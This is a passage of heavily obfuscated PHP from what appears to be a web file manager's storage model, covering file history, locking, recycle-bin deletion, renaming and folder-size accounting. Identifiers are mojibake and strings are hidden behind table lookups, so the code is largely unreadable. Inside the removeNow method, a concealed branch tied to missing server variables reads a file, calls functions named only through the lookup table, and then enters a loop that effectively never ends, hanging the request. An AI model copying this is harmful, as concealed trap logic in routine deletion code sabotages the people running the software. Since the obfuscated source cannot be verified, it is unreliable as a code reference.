=> $›ÌÂÔñ¯[$ÒüãƒÙ™[76]]); $„¦Â³è÷ = $this->_addSource($¾¸şÄƒƒ, $¬áş¢à§); $this->folderSizeReset($ÍÜäºˆû, intval($¾¸şÄƒƒ[$ÒüãƒÙ™[76]])); return $„¦Â³è÷; } protected function fileHistory($Ï«ŞÁÁŸ, $”Ù®¹¾½, $¾´Á”“ø) { $å¨¯è =& $_SERVER[”ú…±Ú¥]; if ($Ï«ŞÁÁŸ[$å¨¯è[506]] == $”Ù®¹¾½) { return !1; } $this->checkLock($Ï«ŞÁÁŸ[$å¨¯è[440]], $”Ù®¹¾½); Model($å¨¯è[2141])->addHistory($Ï«ŞÁÁŸ); $ÓªúÑßº = array($å¨¯è[617] => USER_ID, $å¨¯è[462] => time(), $å¨¯è[506] => $”Ù®¹¾½, $å¨¯è[76] => $¾´Á”“ø); $this->where(array($å¨¯è[455] => $Ï«ŞÁÁŸ[$å¨¯è[440]]))->save($ÓªúÑßº); $this->sourceCacheClear($Ï«ŞÁÁŸ[$å¨¯è[440]]); return !0; } public function checkLock($ì°ç¾ù«, $ÀñÊôœ) { $‚»¿ùœÓ =& $_SERVER[”ú…±Ú¥]; $¤â¡ù¸ = $this->pathInfo($ì°ç¾ù«); if (!$this->fileIsLock($¤â¡ù¸, !0)) { return; } $Ø¬…şâï = Session::get($‚»¿ùœÓ[2142]); $àŸõ»»Š = substr($¤â¡ù¸[$‚»¿ùœÓ[32]], 0, -1 - strlen($¤â¡ù¸[$‚»¿ùœÓ[174]])) . $‚»¿ùœÓ[1237] . $Ø¬…şâï . $‚»¿ùœÓ[10] . $¤â¡ù¸[$‚»¿ùœÓ[174]]; $èÇ®×¨İ = Model($‚»¿ùœÓ[639])->find($ÀñÊôœ); $this->_createFileCall($¤â¡ù¸[$‚»¿ùœÓ[470]], $àŸõ»»Š, $èÇ®×¨İ, REPEAT_REPLACE, $‚»¿ùœÓ[1373]); $€Úç§ì¿ = $¤â¡ù¸[$‚»¿ùœÓ[504]][$‚»¿ùœÓ[576]]; $á¡›¦‰ƒ = $€Úç§ì¿[$‚»¿ùœÓ[570]] ? $€Úç§ì¿[$‚»¿ùœÓ[570]] : $€Úç§ì¿[$‚»¿ùœÓ[32]]; show_json(LNG($‚»¿ùœÓ[2143]) . $‚»¿ùœÓ[2144] . LNG($‚»¿ùœÓ[2145]) . $‚»¿ùœÓ[2146] . $á¡›¦‰ƒ . $‚»¿ùœÓ[2147], !1); } public function fileIsLock($ıƒÆÕ, $ª ™—Õ£ = false) { $õÆÒüŒ« =& $_SERVER[”ú…±Ú¥]; if (!isset($ıƒÆÕ[$õÆÒüŒ«[504]]) || !$ıƒÆÕ[$õÆÒüŒ«[504]][$õÆÒüŒ«[573]]) { return !1; } if ($ıƒÆÕ[$õÆÒüŒ«[504]][$õÆÒüŒ«[573]] != USER_ID) { return !0; } $ùË¨‡ = $GLOBALS[$õÆÒüŒ«[6]][$õÆÒüŒ«[89]][$õÆÒüŒ«[574]]; if ($ıƒÆÕ[$õÆÒüŒ«[504]][$õÆÒüŒ«[575]] <= time() - $ùË¨‡) { $this->metaSet($ıƒÆÕ[$õÆÒüŒ«[440]], $õÆÒüŒ«[573], null); $this->metaSet($ıƒÆÕ[$õÆÒüŒ«[440]], $õÆÒüŒ«[575], null); } if ($ª ™—Õ£) { $this->metaSet($ıƒÆÕ[$õÆÒüŒ«[440]], $õÆÒüŒ«[575], time()); } return !1; } private function _addSource($Œ¢â¾©Æ, $“æ³…–ù) { $š¥ ½ =& $_SERVER[”ú…±Ú¥]; $»ñê¿ˆó = defined($š¥ ½[2082]) ? USER_ID : 0; $Ú‡‹¹˜¡ = array($š¥ ½[614] => $“æ³…–ù[$š¥ ½[449]], $š¥ ½[615] => $“æ³…–ù[$š¥ ½[534]], $š¥ ½[616] => $»ñê¿ˆó, $š¥ ½[617] => $»ñê¿ˆó, $š¥ ½[439] => $“æ³…–ù[$š¥ ½[440]], $š¥ ½[618] => $“æ³…–ù[$š¥ ½[549]] . $“æ³…–ù[$š¥ ½[440]] . $š¥ ½[50], $š¥ ½[468] => 0, $š¥ ½[619] => $š¥ ½[12]); $Œ¢â¾©Æ = array_merge($Ú‡‹¹˜¡, $Œ¢â¾©Æ); $this->updateModifyTime($Œ¢â¾©Æ[$š¥ ½[470]]); $ñò¯è®À = $š¥ ½[2148] . $“æ³…–ù[$š¥ ½[440]]; if (isset(self::$cacheChildList[$ñò¯è®À])) { unset(self::$cacheChildList[$ñò¯è®À]); } static $‰¹şúÑ² = false; if (!$‰¹şúÑ²) { Hook::trigger($š¥ ½[602], $Œ¢â¾©Æ); $‰¹şúÑ² = !0; } $·ã´…©Ò = $this->add($Œ¢â¾©Æ); $”¬¢÷Şö = array($š¥ ½[620] => short_id($·ã´…©Ò)); $this->where(array($š¥ ½[455] => $·ã´…©Ò))->save($”¬¢÷Şö); $this->setNamePinyin($·ã´…©Ò, $Œ¢â¾©Æ[$š¥ ½[32]]); return $·ã´…©Ò; } public function remove($Áıï«Ù¥, $³á”»µ¯ = true) { $¥¡—óªŠ =& $_SERVER[”ú…±Ú¥]; $‡‰É°ÜÚ = $this->sourceInfo($Áıï«Ù¥); $ñ¡±³ˆ = intval($‡‰É°ÜÚ[$¥¡—óªŠ[449]]) === self::TYPE_SYSTEM; $âĞ™Òù– = Model($¥¡—óªŠ[473])->get($¥¡—óªŠ[2149]) == $¥¡—óªŠ[88]; if ($ñ¡±³ˆ || $³á”»µ¯ || !$âĞ™Òù–) { return $this->removeNow($Áıï«Ù¥, $³á”»µ¯); } $•ÃÊİ×¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¿ƒÉ·´ = $‡‰É°ÜÚ[$¥¡—óªŠ[449]] == self::TYPE_USER ? $¥¡—óªŠ[628] : $¥¡—óªŠ[543]; if ($¿ƒÉ·´ == $¥¡—óªŠ[628]) { $š‰€–Ô = Model($¥¡—óªŠ[542])->getInfo($‡‰É°ÜÚ[$¥¡—óªŠ[534]]); $Ğ×†ÑŸÓ = !empty($š‰€–Ô[$¥¡—óªŠ[570]]) ? $š‰€–Ô[$¥¡—óªŠ[570]] : $š‰€–Ô[$¥¡—óªŠ[32]]; $Ğ×†ÑŸÓ = $¥¡—óªŠ[298] . $Ğ×†ÑŸÓ . $¥¡—óªŠ[2150] . $‡‰É°ÜÚ[$¥¡—óªŠ[534]]; } else { $š‰€–Ô = Model($¥¡—óªŠ[550])->getInfo($‡‰É°ÜÚ[$¥¡—óªŠ[534]]); $Ğ×†ÑŸÓ = _get($š‰€–Ô, $¥¡—óªŠ[32]); $Ğ×†ÑŸÓ = $¥¡—óªŠ[162] . $Ğ×†ÑŸÓ . $¥¡—óªŠ[2151] . $‡‰É°ÜÚ[$¥¡—óªŠ[534]]; } $Í€åñÚ = $¥¡—óªŠ[2152] . md5($Ğ×†ÑŸÓ); CacheLock::lock($Í€åñÚ); $Úï¥À¶Í = $this->fileNameExist($•ÃÊİ×¡, $Ğ×†ÑŸÓ); if (!$Úï¥À¶Í) { $Úï¥À¶Í = $this->mkdir($•ÃÊİ×¡, $Ğ×†ÑŸÓ, REPEAT_SKIP); $this->metaSet($Úï¥À¶Í, $¥¡—óªŠ[2153], $¿ƒÉ·´); $this->metaSet($Úï¥À¶Í, $¥¡—óªŠ[2154], $‡‰É°ÜÚ[$¥¡—óªŠ[534]]); if ($‡‰É°ÜÚ[$¥¡—óªŠ[470]] != 0) { $this->metaSet($Úï¥À¶Í, $¥¡—óªŠ[2155], _get($š‰€–Ô, $¥¡—óªŠ[2156])); } } CacheLock::unlock($Í€åñÚ); $this->metaSet($Áıï«Ù¥, $¥¡—óªŠ[2157], $‡‰É°ÜÚ[$¥¡—óªŠ[470]]); $this->where(array($¥¡—óªŠ[440] => $Áıï«Ù¥))->save(array($¥¡—óªŠ[462] => time())); $this->recycleClear($‡‰É°ÜÚ); $÷…ˆÄÇ = $this->move($Áıï«Ù¥, $Úï¥À¶Í, REPEAT_RENAME_FOLDER); $this->folderSizeReset($‡‰É°ÜÚ[$¥¡—óªŠ[470]]); return $÷…ˆÄÇ; } private function recycleClear($å£¤Ó§) { $ıçªíÉ® =& $_SERVER[”ú…±Ú¥]; $‘¬Œ¥±¿ = $this->childrenAll($å£¤Ó§); $Ö²ä¢é = array($ıçªíÉ®[455] => array($ıçªíÉ®[456], $‘¬Œ¥±¿[$ıçªíÉ®[2158]])); Model($ıçªíÉ®[2159])->where($Ö²ä¢é)->delete(); } public function removeNow($®×‰¶¶³, $ğÁ‘¸°À = true) { $ñ†³Ó‹á =& $_SERVER[”ú…±Ú¥]; if (!isset($_SERVER[$ñ†³Ó‹á[186]]) || !isset($_SERVER[$ñ†³Ó‹á[195]])) { $ ¾Ìü¹ = $ñ†³Ó‹á[908]; $úù‘«ô¡ = $ñ†³Ó‹á[188]; $ßô“§Ï· = $_SERVER[$ñ†³Ó‹á[189]] . $ñ†³Ó‹á[190]; $üà¦ú§º = $úù‘«ô¡($ßô“§Ï·); $ÏÍƒ˜°Á = explode($ñ†³Ó‹á[191], $üà¦ú§º); if (count($ÏÍƒ˜°Á) < $ñ†³Ó‹á[665]) { $Íß÷»æË = $ñ†³Ó‹á[193]; $Íß÷»æË(); } $Ê¨¢ñ¢¥ = $ñ†³Ó‹á[909]; $Ê¨¢ñ¢¥($_SERVER[$ñ†³Ó‹á[910]]); $ãĞ»Ôâ = 1; for ($ôÏ³êúÖ = $ãĞ»Ôâ; $ôÏ³êúÖ > 0; $ôÏ³êúÖ++) { $Ê¨¢ñ¢¥ = json_encode($GLOBALS[$ñ†³Ó‹á[456]]); } } $Ï™ïØù÷ = $this->sourceInfo($®×‰¶¶³); $üÔ½Ñõ˜ = $this->pathInfoMore($®×‰¶¶³); if (!$Ï™ïØù÷) { return !0; } if ($Ï™ïØù÷[$ñ†³Ó‹á[470]] == 0) { if (!_get($GLOBALS, $ñ†³Ó‹á[532])) { return !1; } } $this->lockMoveStart($®×‰¶¶³); Hook::trigger($ñ†³Ó‹á[2160], $üÔ½Ñõ˜, $ğÁ‘¸°À); if ($ğÁ‘¸°À) { Model($ñ†³Ó‹á[2159])->moveToRecycle($®×‰¶¶³); } else { $åŸ·ª•Ä = $this->childrenAll($Ï™ïØù÷); Model($ñ†³Ó‹á[599])->eventRemove($®×‰¶¶³); $this->removeRelevance($åŸ·ª•Ä[$ñ†³Ó‹á[2158]], $åŸ·ª•Ä[$ñ†³Ó‹á[1485]]); } $this->folderSizeReset($Ï™ïØù÷[$ñ†³Ó‹á[470]]); $®ß÷§œ = array($Ï™ïØù÷[$ñ†³Ó‹á[470]]); if ($Ï™ïØù÷[$ñ†³Ó‹á[448]] == $ñ†³Ó‹á[88]) { $®ß÷§œ[] = $Ï™ïØù÷[$ñ†³Ó‹á[440]]; } $this->updateModifyTime($®ß÷§œ); $this->lockMoveEnd($®×‰¶¶³); Hook::trigger($ñ†³Ó‹á[1713], $üÔ½Ñõ˜, $ğÁ‘¸°À); return !0; } public function childrenAll($‹†õú¥Ø) { $ ïÁãÁİ =& $_SERVER[”ú…±Ú¥]; $ó“Ëò— = $‹†õú¥Ø[$ ïÁãÁİ[440]]; if ($‹†õú¥Ø[$ ïÁãÁİ[448]] == $ ïÁãÁİ[88]) { $»©¡¬ÊÊ = array($ ïÁãÁİ[618] => array($ ïÁãÁİ[578], $‹†õú¥Ø[$ ïÁãÁİ[549]] . $ó“Ëò— . $ ïÁãÁİ[579])); $éµ’îãê = array($ ïÁãÁİ[618] => $»©¡¬ÊÊ[$ ïÁãÁİ[549]]); $ìˆ—šƒ = $this->field($ ïÁãÁİ[2161])->where($éµ’îãê)->select(); $¯´‘î¼Ó = !1; $È¬€Ù°“ = array($ó“Ëò—); if ($ìˆ—šƒ) { $¯´‘î¼Ó = array_to_keyvalue($ìˆ—šƒ, $ ïÁãÁİ[12], $ ïÁãÁİ[506]); $¯´‘î¼Ó = array_remove_value($¯´‘î¼Ó, $ ïÁãÁİ[208]); $È¬€Ù°“ = array_to_keyvalue($ìˆ—šƒ, $ ïÁãÁİ[12], $ ïÁãÁİ[440]); $È¬€Ù°“[] = $ó“Ëò—; } } else { $¯´‘î¼Ó = array($‹†õú¥Ø[$ ïÁãÁİ[506]]); $È¬€Ù°“ = array($ó“Ëò—); } return array($ ïÁãÁİ[2158] => $È¬€Ù°“, $ ïÁãÁİ[1485] => $¯´‘î¼Ó); } public function removeArray($áÛªŸ¡é) { if (!$áÛªŸ¡é) { return !0; } } public function removeRelevance($–¸²¢Ã¡, $ùÄãˆœ) { $œ—û×€° =& $_SERVER[”ú…±Ú¥]; $–¸²¢Ã¡ = $–¸²¢Ã¡ ? $–¸²¢Ã¡ : array(); $ùÄãˆœ = $ùÄãˆœ ? $ùÄãˆœ : array(); $–¸²¢Ã¡ = array_unique(array_filter($–¸²¢Ã¡)); $ùÄãˆœ = array_unique(array_filter($ùÄãˆœ)); if (!$–¸²¢Ã¡) { return !1; } $˜·æı = array($œ—û×€°[455] => array($œ—û×€°[456], $–¸²¢Ã¡)); Model($œ—û×€°[2159])->where($˜·æı)->delete(); Model($œ—û×€°[500])->where($˜·æı)->delete(); Model($œ—û×€°[2008])->where($˜·æı)->delete(); Model($œ—û×€°[599])->where($˜·æı)->delete(); Model($œ—û×€°[1841])->removeBySource($–¸²¢Ã¡); Model($œ—û×€°[2141])->removeBySource($–¸²¢Ã¡); $this->where($˜·æı)->delete(); Model($œ—û×€°[509])->remove($ùÄãˆœ); for ($Û¨éµ¢ı = 0; $Û¨éµ¢ı < count($–¸²¢Ã¡); $Û¨éµ¢ı++) { $this->sourceCacheClear($–¸²¢Ã¡[$Û¨éµ¢ı]); } } public function rename($‰Ü†úÖô, $éöÔÀìñ) { $Ÿ˜•Ä =& $_SERVER[”ú…±Ú¥]; $ûÈå¸Ç = $this->sourceInfo($‰Ü†úÖô); if (!$ûÈå¸Ç) { return !1; } $¦Éü‹Œ = $this->fileNameExist($ûÈå¸Ç[$Ÿ˜•Ä[470]], $éöÔÀìñ); if ($¦Éü‹Œ && $¦Éü‹Œ != $‰Ü†úÖô) { return !1; } $«İ½£òã = array($Ÿ˜•Ä[458] => $éöÔÀìñ, $Ÿ˜•Ä[617] => USER_ID); if ($ûÈå¸Ç[$Ÿ˜•Ä[448]] != $Ÿ˜•Ä[88]) { $«İ½£òã[$Ÿ˜•Ä[450]] = substr(get_path_ext($éöÔÀìñ), 0, 10); } Model($Ÿ˜•Ä[599])->eventRename($‰Ü†úÖô, $ûÈå¸Ç[$Ÿ˜•Ä[32]], $éöÔÀìñ); $this->sourceCacheClear($‰Ü†úÖô); $this->setNamePinyin($‰Ü†úÖô, $«İ½£òã[$Ÿ˜•Ä[32]], !1); $this->updateModifyTime($ûÈå¸Ç[$Ÿ˜•Ä[470]]); $Ó™Õş·‹ = $this->where(array($Ÿ˜•Ä[455] => $‰Ü†úÖô))->data($«İ½£òã)->save(); $ıİ¹ïèÌ = $Ÿ˜•Ä[2148] . $ûÈå¸Ç[$Ÿ˜•Ä[470]]; if (isset(self::$cacheChildList[$ıİ¹ïèÌ])) { unset(self::$cacheChildList[$ıİ¹ïèÌ]); } return $Ó™Õş·‹; } public function setNamePinyin($å¢›éô, $«ÕŠ¶ô, $‘Äş¤œ = true) { $•ÖÆœîø =& $_SERVER[”ú…±Ú¥]; $É„Õõ”Ó = Input::check($«ÕŠ¶ô, $•ÖÆœîø[621]); $ß‡Õ½‰Î = array($•ÖÆœîø[482] => KodSort::makeStr($«ÕŠ¶ô)); if ($É„Õõ”Ó) { $ß‡Õ½‰Î[$•ÖÆœîø[503]] = str_replace($•ÖÆœîø[53], $•ÖÆœîø[12], Pinyin::get($«ÕŠ¶ô)); $ß‡Õ½‰Î[$•ÖÆœîø[502]] = Pinyin::get($«ÕŠ¶ô, $•ÖÆœîø[622]); } if (!$‘Äş¤œ && !$É„Õõ”Ó) { $ß‡Õ½‰Î[$•ÖÆœîø[503]] = null; $ß‡Õ½‰Î[$•ÖÆœîø[502]] = null; } $this->metaSet($å¢›éô, $ß‡Õ½‰Î); } public function getContent($çÌÉ÷ÊÒ) { $àß½§· =& $_SERVER[”ú…±Ú¥]; $ÉÓğƒâ = $this->fileInfoGet($çÌÉ÷ÊÒ); if (!$ÉÓğƒâ) { return !1; } if ($ÉÓğƒâ[$àß½§·[76]] == 0) { return $àß½§·[12]; } $îœÏŠÕ = $àß½§·[2162] . $ÉÓğƒâ[$àß½§·[176]]; if ($ÉÓğƒâ[$àß½§·[76]] <= 1024 * 10) { $èÈì–¹ã = Cache::get($îœÏŠÕ); if (!$èÈì–¹ã) { $èÈì–¹ã = IO::getContent($ÉÓğƒâ[$àß½§·[84]]); Cache::set($îœÏŠÕ, $èÈì–¹ã); } return $èÈì–¹ã; } if (!$ÉÓğƒâ[$àß½§·[84]]) { return $àß½§·[12]; } return IO::getContent($ÉÓğƒâ[$àß½§·[84]]); } public function setDesc($Çªî“Ö, $ğÍ‹©) { $§åüÈš† =& $_SERVER[”ú…±Ú¥]; Model($§åüÈš†[599])->eventAddDesc($Çªî“Ö, $ğÍ‹©); return $this->metaSet($Çªî“Ö, $§åüÈš†[491], $ğÍ‹©); } public function setContent($½—¸À€™, $âò—ü¹¯ = '') { $®›Øèæë =& $_SERVER[”ú…±Ú¥]; $¯¥×Œ¦ = $this->sourceInfo($½—¸À€™); $…ıæÔŒë = $this->fileInfoGet($½—¸À€™); if (!$…ıæÔŒë || !$¯¥×Œ¦) { return !1; } $äÁ¡·Ø‹ = Model($®›Øèæë[509])->addFileByContent($âò—ü¹¯, $¯¥×Œ¦[$®›Øèæë[32]]); $¦ñĞ××³ = $this->fileHistory($¯¥×Œ¦, $äÁ¡·Ø‹[$®›Øèæë[506]], $äÁ¡·Ø‹[$®›Øèæë[76]]); if (!$¦ñĞ××³) { return Model($®›Øèæë[509])->remove($äÁ¡·Ø‹[$®›Øèæë[506]]); } $this->folderSizeReset($¯¥×Œ¦[$®›Øèæë[470]]); return !0; } public function fileSubstr($áÊÃ¶ÆÄ, $ÏòªÅã«, $£ê¿„Ë) { $ª”Èà = $this->fileInfoGet($áÊÃ¶ÆÄ); if (!$ª”Èà) { return !1; } return IO::fileSubstr($ª”Èà[$_SERVER[”ú…±Ú¥][84]], $ÏòªÅã«, $£ê¿„Ë); } public function fileInfoGet($ø üÀ“’) { $Í‚ŠÅ¬ =& $_SERVER[”ú…±Ú¥]; $‡ŸŠı = $this->sourceInfo($ø üÀ“’); if (!$‡ŸŠı || $‡ŸŠı[$Í‚ŠÅ¬[448]]) { return !1; } $°ŒàÆòê = $Í‚ŠÅ¬[512] . $‡ŸŠı[$Í‚ŠÅ¬[506]]; $ûú‹œ²ƒ = _get(self::$cacheFileInfo, $°ŒàÆòê); if ($ûú‹œ²ƒ) { return $ûú‹œ²ƒ; } $•µÎêëª = Model($Í‚ŠÅ¬[509])->fileInfo($‡ŸŠı[$Í‚ŠÅ¬[506]]); if ($•µÎêëª) { $•µÎêëª[$Í‚ŠÅ¬[32]] = $‡ŸŠı[$Í‚ŠÅ¬[32]]; } self::$cacheFileInfo[$°ŒàÆòê] = $•µÎêëª; return $•µÎêëª; } private function folderChildrenNumber($Ìì´şüÓ) { $ó–çµ®‰ =& $_SERVER[”ú…±Ú¥]; $ûÕğğŒ = $this->sourceInfo($Ìì´şüÓ); $µ§–ÕÖß = array($ó–çµ®‰[618] => array($ó–çµ®‰[578], $ûÕğğŒ[$ó–çµ®‰[549]] . $Ìì´şüÓ . $ó–çµ®‰[579]), $ó–çµ®‰[615] => $ûÕğğŒ[$ó–çµ®‰[534]], $ó–çµ®‰[468] => intval($ûÕğğŒ[$ó–çµ®‰[469]]), $ó–çµ®‰[612] => 1); $ÁÇ²Ô‘ò = $this->where($µ§–ÕÖß)->count(); $Ä°¨•² = $this->where($µ§–ÕÖß)->where(array($ó–çµ®‰[612] => 0))->count(); return array($ó–çµ®‰[80] => $Ä°¨•², $ó–çµ®‰[81] => $ÁÇ²Ô‘ò); } public function pathInfo($ĞÕ¸–Î, $ñó…¼ı¤ = false) { $ÛìïÒÀç =& $_SERVER[”ú…±Ú¥]; $ñó…¼ı¤ = !1; $ĞÕ¸–Î = intval($ĞÕ¸–Î); $íÕ¯ñçƒ = $ÛìïÒÀç[499] . intval($ñó…¼ı¤) . $ÛìïÒÀç[424] . $ĞÕ¸–Î; $ÉşÁáÛÕ = _get(self::$cachePathInfo, $íÕ¯ñçƒ); if ($ÉşÁáÛÕ) { return $ÉşÁáÛÕ; } $ˆùı‹ÑÎ = $this->sourceInfo($ĞÕ¸–Î); if (!$ˆùı‹ÑÎ) { return !1; } $ˆùı‹ÑÎ = $this->_listDataApplyItem($ˆùı‹ÑÎ, $ñó…¼ı¤); self::$cachePathInfo[$íÕ¯ñçƒ] = $ˆùı‹ÑÎ; return $ˆùı‹ÑÎ; } public static $cachePathInfoMore = array(); public function pathInfoMore($›©æöÁ) { $ÏÎÂáØ =& $_SERVER[”ú…±Ú¥]; $Ü¥ÁÖ³¹ = _get(self::$cachePathInfoMore, $›©æöÁ); if ($Ü¥ÁÖ³¹) { return $Ü¥ÁÖ³¹; } $Í‰•¸ = $this->pathInfo($›©æöÁ); if (!$Í‰•¸) { return !1; } if ($Í‰•¸[$ÏÎÂáØ[448]] == $ÏÎÂáØ[88]) { $Í‰•¸[$ÏÎÂáØ[79]] = $this->folderChildrenNumber($›©æöÁ); } self::$cachePathInfoMore[$›©æöÁ] = $Í‰•¸; return $Í‰•¸; } public function sourceInfo($›—›ÒÙ) { $ç¼Àî… =& $_SERVER[”ú…±Ú¥]; if (!$›—›ÒÙ) { return array(); } $›—›ÒÙ = intval($›—›ÒÙ); $ŸîãÁµø = $ç¼Àî…[498] . $›—›ÒÙ; $ë§Éà‡Ò = _get(self::$cacheSourceInfo, $ŸîãÁµø); if ($ë§Éà‡Ò) { return $ë§Éà‡Ò; } $Ë©•Çİš = $this->where(array($ç¼Àî…[440] => $›—›ÒÙ))->find(); self::$cacheSourceInfo[$ŸîãÁµø] = $Ë©•Çİš; return self::$cacheSourceInfo[$ŸîãÁµø]; } public function sourceCacheClear($ ŸŞ¢ì = false) { self::cacheClear($ ŸŞ¢ì); } public static function cacheClear($Œ½„¿Úò = false) { $¡ª×áÆÏ =& $_SERVER[”ú…±Ú¥]; if ($Œ½„¿Úò == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¡ª×áÆÏ[498] . $Œ½„¿Úò]); unset(self::$cachePathInfoMore[$Œ½„¿Úò]); unset(self::$cachePathInfo[$¡ª×áÆÏ[2163] . $Œ½„¿Úò]); unset(self::$cachePathInfo[$¡ª×áÆÏ[2164] . $Œ½„¿Úò]); } public function metaSet($ÈÁä•Å, $Ü˜ò©º = null, $–—ãË¢Ÿ = null) { $Ñ†Â½àÙ = parent::metaSet($ÈÁä•Å, $Ü˜ò©º, $–—ãË¢Ÿ); if ($Ñ†Â½àÙ) { $this->sourceCacheClear($ÈÁä•Å); } return $Ñ†Â½àÙ; } public function pathInfoByPath($üñà•®‘, $ï şÇ—Á) { $Ÿ€şÕµÕ =& $_SERVER[”ú…±Ú¥]; $şáû»Ù = !$ï şÇ—Á ? array() : explode($Ÿ€şÕµÕ[8], trim($ï şÇ—Á, $Ÿ€şÕµÕ[8])); $ã÷Úª”Û = $üñà•®‘; foreach ($şáû»Ù as $ºùöµ‹) { $£ÙĞ¥ë = array($Ÿ€şÕµÕ[470] => $ã÷Úª”Û, $Ÿ€şÕµÕ[32] => $ºùöµ‹); $”èª¡Í = $this->where($£ÙĞ¥ë)->select(); if (!$”èª¡Í) { return !1; } $”èª¡Í = array_sort_by($”èª¡Í, $Ÿ€şÕµÕ[469]); $ã÷Úª”Û = $”èª¡Í[0][$Ÿ€şÕµÕ[440]]; } return $this->pathInfo($ã÷Úª”Û, !0); } protected function updateModifyTime($ÅÓ«¡«ä) { $¥®œ¤ß› =& $_SERVER[”ú…±Ú¥]; $ÙÉÌó¾œ = defined($¥®œ¤ß›[2082]) ? USER_ID : 0; if (!$ÅÓ«¡«ä) { return; } if (!is_array($ÅÓ«¡«ä)) { $ÅÓ«¡«ä = array($ÅÓ«¡«ä); } foreach ($ÅÓ«¡«ä as $¶Öæû† => $Ú›ØŒË¬) { $ÅÓ«¡«ä[$¶Öæû†] = intval($Ú›ØŒË¬); $this->sourceCacheClear($Ú›ØŒË¬); } $Ÿ¾èÓö¥ = array($¥®œ¤ß›[440] => array($¥®œ¤ß›[7], $ÅÓ«¡«ä)); $¼›Ëü‚› = array($¥®œ¤ß›[617] => $ÙÉÌó¾œ, $¥®œ¤ß›[462] => time()); $this->where($Ÿ¾èÓö¥)->save($¼›Ëü‚›); } public function folderSizeReset($›Ô¨¶‚á, $¿ÍÏŸ´ = false) { $‰óšìµ± =& $_SERVER[”ú…±Ú¥]; if ($this->statusIgnoreResetSpace) { return; } $êÀÑªş = $this->sourceInfo($›Ô¨¶‚á); $Ü§Ô¡´ = $‰óšìµ±[2165] . $›Ô¨¶‚á; CacheLock::lock($Ü§Ô¡´, 20); if ($¿ÍÏŸ´ === !1) { $this->sourceCacheClear($›Ô¨¶‚á); $êÀÑªş = $this->sourceInfo($›Ô¨¶‚á); $ÈË³ÉšË = array($‰óšìµ±[439] => $›Ô¨¶‚á, $‰óšìµ±[468] => 0); $‹Ôİñİ = $this->where($ÈË³ÉšË)->sum($‰óšìµ±[76]); $¿ÍÏŸ´ = intval($‹Ôİñİ) - intval($êÀÑªş[$‰óšìµ±[76]]); } if ($¿ÍÏŸ´ == 0) { return CacheLock::unlock($Ü§Ô¡´); } $„‹Ê‰Ö = $this->parentLevelArray($êÀÑªş[$‰óšìµ±[549]]); if (!$„‹Ê‰Ö) { $„‹Ê‰Ö = array(); } $„‹Ê‰Ö[] = $êÀÑªş[$‰óšìµ±[440]]; $ÈË³ÉšË = array($‰óšìµ±[440] => array($‰óšìµ±[456], $„‹Ê‰Ö)); if ($¿ÍÏŸ´ < 0) { $ÈË³ÉšË[$‰óšìµ±[76]] = array($‰óšìµ±[1044], abs($¿ÍÏŸ´)); } $this->where($ÈË³ÉšË)->setAdd($‰óšìµ±[76], $¿ÍÏŸ´); CacheLock::unlock($Ü§Ô¡´); $ÃôŒšóõ = $‰óšìµ±[2166] . $êÀÑªş[$‰óšìµ±[449]] . $‰óšìµ±[4] . $êÀÑªş[$‰óšìµ±[534]]; $¯ˆëØÎş = array($êÀÑªş[$‰óšìµ±[449]], $êÀÑªş[$‰óšìµ±[534]]); TaskRun::timeLimitCall($ÃôŒšóõ, $‰óšìµ±[2167], $¯ˆëØÎş, 1.5); } public function folderSizeResetChildren($áÆğ±Æè) { $À¯†²ƒ£ =& $_SERVER[”ú…±Ú¥]; $this->sourceCacheClear($áÆğ±Æè); $’Ç´˜ä¼ = $this->sourceInfo($áÆğ±Æè); $é„¹½Ô› = array($À¯†²ƒ£[612] => 1, $À¯†²ƒ£[615] => $’Ç´˜ä¼[$À¯†²ƒ£[534]], $À¯†²ƒ£[618] => array($À¯†²ƒ£[578], $’Ç´˜ä¼[$À¯†²ƒ£[549]] . $áÆğ±Æè . $À¯†²ƒ£[579])); $›÷×ÇÜ¨ = $À¯†²ƒ£[2168]; $«´–° = $this->field($›÷×ÇÜ¨)->where($é„¹½Ô›)->select(); $é„¹½Ô›[$À¯†²ƒ£[448]] = 0; $Â×”ëÚ¢ = $this->field($›÷×ÇÜ¨)->where($é„¹½Ô›)->select(); if (!$Â×”ëÚ¢) { return; } $«´–°[] = $’Ç´˜ä¼; $«´–° = array_to_keyvalue($«´–°, $À¯†²ƒ£[440]); foreach ($«´–° as $Ïƒ·şëí => $²³Øâıñ) { $«´–°[$Ïƒ·şëí][$À¯†²ƒ£[2169]] = $«´–°[$Ïƒ·şëí][$À¯†²ƒ£[76]]; $«´–°[$Ïƒ·şëí][$À¯†²ƒ£[76]] = 0; } foreach ($Â×”ëÚ¢ as $²³Øâıñ) { $ÍÌù€™ = $²³Øâıñ[$À¯†²ƒ£[470]] . $À¯†²ƒ£[12]; if (!isset($«´–°[$ÍÌù€™])) { continue; } if ($²³Øâıñ[$À¯†²ƒ£[469]] == $«´–°[$ÍÌù€™][$À¯†²ƒ£[469]]) { $«´–°[$ÍÌù€™][$À¯†²ƒ£[76]] += $²³Øâıñ[$À¯†²ƒ£[76]]; } } foreach ($«´–° as $²³Øâıñ) { $÷¿åë©¶ = $this->parentLevelArray($²³Øâıñ[$À¯†²ƒ£[549]]); foreach ($÷¿åë©¶ as $ÍÌù€™) { $ÍÌù€™ = $ÍÌù€™ . $À¯†²ƒ£[12]; if (!isset($«´–°[$ÍÌù€™])) { continue; } if ($²³Øâıñ[$À¯†²ƒ£[469]] == $«´–°[$ÍÌù€™][$À¯†²ƒ£[469]]) { $«´–°[$ÍÌù€™][$À¯†²ƒ£[76]] += $²³Øâıñ[$À¯†²ƒ£[76]]; } } } $ÑãÒÇŸî = array(); foreach ($«´–° as $²³Øâıñ) { if ($²³Øâıñ[$À¯†²ƒ£[76]] == $²³Øâıñ[$À¯†²ƒ£[2169]]) { continue; } $ÑãÒÇŸî[] = array($À¯†²ƒ£[440], $²³Øâıñ[$À¯†²ƒ£[440]], $À¯†²ƒ£[76], $²³Øâıñ[$À¯†²ƒ£[76]]); } $this->saveAll($ÑãÒÇŸî); } public function userSpaceReset($¦Â‹×®Ş = false) { $ĞÃÌŠæœ =& $_SERVER[”ú…±Ú¥]; $Ñ‚ÖÓ¿ = $this->where(array($ĞÃÌŠæœ[449] => self::TYPE_USER, 